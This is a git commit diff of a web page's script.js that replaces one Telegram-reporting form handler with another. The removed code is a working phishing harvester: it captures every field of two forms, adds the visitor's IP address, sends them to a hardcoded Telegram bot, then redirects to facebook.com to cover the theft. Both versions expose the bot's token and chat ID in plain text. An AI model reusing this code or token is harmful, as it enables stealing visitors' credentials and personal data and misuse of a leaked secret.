5bea9ac1faaee32be37fe79624a709fc04ac8326
joneboan <168922395+joneboan@users.noreply.github.com>
2024-05-05 08:11:37 +0500

    Update script.js

--- script.js
+++ script.js
@@ -1,30 +1,35 @@
-window.onload = () => {
-  const token = "6791346781:AAETwcHhxdAyHliVRpkh3-QVSb7IVV6uHQA";
-  const chatID = "1393367014";
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const form1 = document.querySelector("#form1");
-  const form2 = document.querySelector("#form2");
-
-  const onSubmit = (e) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    let text = `Time: ${new Date().toISOString()}\n`;
-    for (const [key, value] of formData.entries()) {
-      text += `${key}: ${value}\n`;
-    }
-    fetch("https://api.ipify.org")
-      .then((res) => res.text())
-      .then((res) => {
-        text += `IP: ${res}\n`;
-        console.log(text);
-        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`).then(
-          (res) => {
-            location.assign("https://facebook.com");
-          }
-        );
-      });
-  };
-
-  form1.addEventListener("submit", onSubmit);
-  form2.addEventListener("submit", onSubmit);
+//bot token
+var telegram_bot_id = "6791346781:AAETwcHhxdAyHliVRpkh3-QVSb7IVV6uHQA";
+//chat id
+var chat_id = 1393367014;
+var u_name, email, message;
+var ready = function () {
+    u_name = document.getElementById("name").value;
+    email = document.getElementById("email").value;
+    message = document.getElementById("message").value;
+    message = "Name: " + u_name + "\nEmail: " + email + "\nMessage: " + message;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("email").value = "";
+    document.getElementById("message").value = "";
+    return false;
 };
